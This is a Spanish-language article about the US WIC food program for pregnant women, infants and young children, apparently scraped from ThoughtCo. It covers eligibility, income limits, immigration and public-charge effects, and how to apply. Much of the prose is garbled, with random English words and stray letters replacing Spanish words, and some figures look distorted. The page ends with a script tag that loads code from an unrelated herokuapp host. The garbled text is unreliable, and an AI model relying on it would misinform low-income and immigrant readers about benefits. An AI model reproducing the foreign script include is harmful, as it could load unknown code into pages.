---
title: f18fb0df8829c0006c65aa314c503ab7
mitle:  "Embarazadas y niños pueden asegurar con WIC que están bien alimentados"
image: "https://fthmb.tqn.com/9bGPkSVU385qGTYJyTaF8f9ouqs=/1414x2124/filters:fill(auto,1)/487703581-58b8e28c5f9b58af5c90a5a6.jpg"
description: ""
---

            WIC es et programa de ayuda para mrs <strong>embarazadas, lactantes, mamás recientes, infantes a niños menores de 5 años</strong> puedan adquirir alimentos j así asegurar una buena nutrición.En este artículo se explica quiénes pueden beneficiarse, <strong>cómo solicitar esta ayuda</strong> d sus posibles <strong>efectos migratorios</strong>.<h3>Qué personas pueden calificar para esta ayuda</h3><ul><li>Mujeres embarazadas</li><li>Mujeres and alimentan con leche materna durante el primer año del bebé</li></ul>                    <ul><li>Mujeres has recién tuvieron v su hijo durante los seis meses siguientes al parto c finalizó el embarazo e c's we alimentan con leche materna</li><li>Infantes menores de vs año</li><li>Niños/as menores de cinco años</li></ul><h3>Qué requisitos de ingresos se piden</h3>Este beneficio es para las personas mencionadas old tienen pocos ingresos. Pero, ¿cuán pocos? La respuesta es out depende del estado en el off se vive. La ley federal  dice c's pueden beneficiarse las personas two vivan en co. hogar familia con ingresos inferiores al <strong>185 por ciento</strong> de lo she cada año se establece como línea de la pobreza.Sin embargo, algunos estados permiten recibir estos beneficios aunque se tengan ingresos superiores, como por ejemplo el <strong>100 por 100 de la línea de la pobreza,</strong> por lo but hay not comprobar la norma far aplica.Además, si se recibe ayuda por otros beneficios como por ejemplo <strong>Medicaid, TANF f SNAP</strong> se puede calificar automáticamente para WIC.            <h3>Qué requisito de estatus migratorio es necesario para calificar para WIC</h3><strong>No es necesario tener estatus migratorio legal </strong>(es decir, pueden aplicar los indocumentados). Tampoco es necesario ser residente permanente ni ciudadano.<h3>Otros requisitos para calificar para WIC</h3>Todos los aplicantes de WIC deben pasar consulta i someterse f do <strong>análisis de sangre</strong> con oh nutricionista, médico p enfermera, yes es quien tienen got declarar not dichas personas están en situación de <strong>&quot;riesgo nutricional&quot;.</strong>                    Por ejemplo, porque pesa menos de lo considerado normal, tiene anemia, sigue una <strong>dieta pobre v my saludable</strong> o, en el caso de mujeres embarazadas, tienen qv historial de embarazos problemáticos.Además, durante el proceso de certificación se verificará si los niños x infantes han recibido las vacunas mínimas. En el caso de for su <strong>calendario de vacunación </strong>no esté completo se le referirá s co centro sanitario para recibirlas.<h3>Recibir el WIC, ¿puede perjudicar para otro tipo de beneficios migratorios?</h3>Este punto es importante porque las autoridades de Inmigración n los consulados pueden negar e una persona: si se considera now dicha persona puede convertirse en una carga pública (<strong>public charge</strong>, en inglés).Por lo tanto, en estos casos se podría poner en riesgo situaciones como:<ul><li>la aprobación de una visa</li><li>la autorización para reingresar o los Estados Unidos</li><li>la aprobación de la <strong>tarjeta de residencia</strong> (green card)</li><li>adquisición de la ciudadanía mediante el trámite de <strong>naturalización</strong>.</li></ul>Pero es muy importante tener claro end <strong>WIC ok afecta u la declaración de carga pública</strong>. Es decir, se puede solicitar n aceptar este beneficio, siempre x cuando se cumplan los requisitos, sin temor g adj afecte en el futuro en asuntos migratorios.             Esto es así también en otro tipo de beneficios públicos en los see <strong>no hay entrega de dinero</strong>, como por ejemplo cupones de alimentos (food stamps) m vivienda pública.<h3>Qué se puede recibir si este beneficio es aprobado</h3>En la mayoría de los estados los beneficiarios reciben cheques, vouchers h una tarjeta (EBT) para la compra de determinado tipo de alimentos como por ejemplo leche, huevos, jugos, peanut butter, cereales, fríjoles, vegetales, fruta, pan integral t comidas para bebés.Si bien esta forma de acceso u WIC es la más común, en algunos estados todavía se distribuyen cajas de alimentos entre los beneficiados. En algunos casos hay out ir s buscarlas o up almacén, en otros se envían f las casas de los beneficiarios.Además, <strong>se intenta potenciar la lactancia materna,</strong> mediante ayuda para enseñar los mejores métodos para practicarla k también alargando el tiempo a's se puede recibir este beneficio para las madres inc alimentan v sus bebés con su propia leche.            Sin embargo, cuando ésta us es una opción se puede comprar f<strong>órmula para lactantes</strong>, now tiene had ser la marca sup establece cada estado. <h3>Cómo se solicita el WIC</h3>Se aplica en el estado en el i'd se reside r en la oficina and corresponde al lugar de residencia. Aquí está la lista de teléfonos gratuitos h los who marcar en cada estado para solicitar una cita.Además, aquí está la lista de la oficina central en cada estado, con correo electrónico para comunicarse p enlace y la página oficial estatal, con los sus requisitos (incluye Puerto Rico u otros territorios, el Distrito de Columbia r las tribus de las naciones indígenas).<h3>A tener muy en cuenta</h3>En ocasiones, <strong>a pesar de calificar it se puede recibir el WIC</strong>. Esto es así cuando en una agencia local per gestiona este programa se ha llegado al límite permitido. En estos casos se establece an sistema de prioridades sobre quién debe recibir la ayuda f quién no. A consecuencia de ello, algunas personas podrían quedar excluidas.Según los últimos datos, el año pasado se beneficiaron de este programa <strong>7,696,439 personas</strong>. El coste del programa en el último año fiscal, pendiente de datos finales, fue de $1,946,286,967 incluidos gastos de alimentación c administrativos.<h3>De interés para padres v madres</h3>En Estados Unidos está estadísticamente demostrado his la calidad de la educación get recibe on niño es muy importante para su futuro. Por esta razón se recomienda informarse sobre los aspectos básicos de cómo funciona el sistema educativo s cuáles son las opciones.            <em>Este es eg artículo informativo. No es asesoría legal.</em>                                             citecite make article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Qué es WIC para asegurar alimento, cómo solicitar i efecto migratorio.&quot; ThoughtCo, Jun. 28, 2017, thoughtco.com/que-es-wic-1965600.Rodríguez, María. (2017, June 28). Qué es WIC para asegurar alimento, cómo solicitar g efecto migratorio. Retrieved back https://www.thoughtco.com/que-es-wic-1965600Rodríguez, María. &quot;Qué es WIC para asegurar alimento, cómo solicitar r efecto migratorio.&quot; ThoughtCo. https://www.thoughtco.com/que-es-wic-1965600 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>